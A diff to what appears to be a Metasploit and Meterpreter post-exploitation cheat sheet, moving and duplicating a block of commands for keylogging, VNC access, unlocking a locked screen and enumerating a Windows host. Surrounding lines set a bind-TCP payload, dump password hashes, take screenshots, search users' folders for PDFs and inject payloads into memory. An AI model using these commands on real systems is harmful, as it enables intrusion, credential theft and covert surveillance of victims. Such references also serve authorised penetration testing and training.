@@ -192,7 +192,19 @@ set PAYLOAD windows/metsvc_bind_tcp
 set LPORT <port>
 set RHOST <target IP>
 exploit
-------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
+idletime
+     if time < 5 min
+     keyscan_start                            Start the keylogger.
+     keyscan_stop                             Stop the keylogger.
+     keyscan_dump                             Dump keystrokes.
+
+run vnc
+     if the screen is locked exit VNC
+     meterpreter > run screen_unlock
+meterpreter > run get_application_list
+meterpreter > run winenum
+--------------------------------------------------------------------------------                      
 
 # Phishing
 
@@ -258,6 +270,21 @@ getuid                                        Show current privileges.
 screenshot                                    Take a photo of the desktop.
 
 hashdump                                      Dump password hashes.
+
+==========
+
+idletime
+     if time < 5 min
+     keyscan_start                            Start the keylogger.
+     keyscan_stop                             Stop the keylogger.
+     keyscan_dump                             Dump keystrokes.
+
+run vnc
+     if the screen is locked exit VNC
+     meterpreter > run screen_unlock
+meterpreter > run get_application_list
+meterpreter > run winenum
+==========
 
 enum_logged_on_users
 search -d c:\\documents\ and\ settings\\<user>\\ -f *.pdf
@@ -329,18 +356,6 @@ If upload is successful
      shell                                    Drop into a Windows shell.
      cd \                                     Change to root directory.
 ==========
-
-idletime
-     if time < 5 min
-     keyscan_start                            Start the keylogger.
-     keyscan_stop                             Stop the keylogger.
-     keyscan_dump                             Dump keystrokes.
-
-run vnc
-     if the screen is locked exit VNC
-     meterpreter > run screen_unlock
-meterpreter > run get_application_list
-meterpreter > run winenum
 
 shell                                         Drop into a Windows shell.
 (from a Windows shell)
@@ -487,4 +502,3 @@ run
 getgui will not work on Windows 2000 Server. Instead try: set PAYLOAD windows/vncinject/reverse_tcp
 
 For injecting into memory: use exploit/windows/local/payload_inject
-
